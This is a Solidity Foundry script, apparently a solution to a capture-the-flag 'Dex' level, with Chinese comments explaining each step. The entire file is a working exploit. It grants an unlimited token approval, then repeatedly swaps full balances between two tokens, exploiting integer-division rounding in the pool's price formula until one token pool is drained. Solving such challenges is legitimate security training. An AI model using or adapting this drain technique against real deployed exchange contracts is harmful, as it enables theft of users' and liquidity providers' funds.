// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IDex {
    function swap(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function token1() external view returns (address);
    function token2() external view returns (address);
    function balanceOf(address token, address account) external view returns (uint256);
}

contract DexAttackScript is Script {
    function run() external {
        address dexLevel = 0x5279854DF4ac8dA8B8627F0bB5a1BDabcDAE4001;
        IDex dex = IDex(dexLevel);

        vm.startBroadcast();

        address t1 = dex.token1();
        address t2 = dex.token2();
        address player = msg.sender;

        // 一次性 approve 上限,后面随便 swap 不再卡 allowance
        dex.approve(dexLevel, type(uint256).max);

        // 在两个币之间反复全仓 swap,利用整数除法的精度损失,
        // 让池子比例越来越失衡,最终一种 token 的池子被清零
        address from = t1;
        address to = t2;

        for (uint256 i = 0; i < 20; i++) {
            uint256 myBal = dex.balanceOf(from, player);
            uint256 dexToBal = dex.balanceOf(to, dexLevel);

            if (myBal == 0) {
                // 反向再来一次
                (from, to) = (to, from);
                continue;
            }

            // 算这次能从池子里"挖"出多少 to-token
            // 公式: swap_out = myBal * dexToBal / dexFromBal
            uint256 dexFromBal = dex.balanceOf(from, dexLevel);
            uint256 expectedOut = (myBal * dexToBal) / dexFromBal;

            // 如果算出来的 out >= 池子里 to 的余额, 说明这一次能把池子掏空
            // 此时 swap 量要卡到精确值,使 to 池清零、不超额
            uint256 swapAmount = myBal;
            if (expectedOut >= dexToBal) {
                // 反推:让 swap_out 恰好等于 dexToBal
                // amount * dexToBal / dexFromBal = dexToBal
                // amount = dexFromBal
                swapAmount = dexFromBal;

                dex.swap(from, to, swapAmount);
                console.log("Drained pool of token:", to);
                break;
            }

            dex.swap(from, to, swapAmount);

            // 反向继续刷
            (from, to) = (to, from);
        }

        vm.stopBroadcast();
    }
}
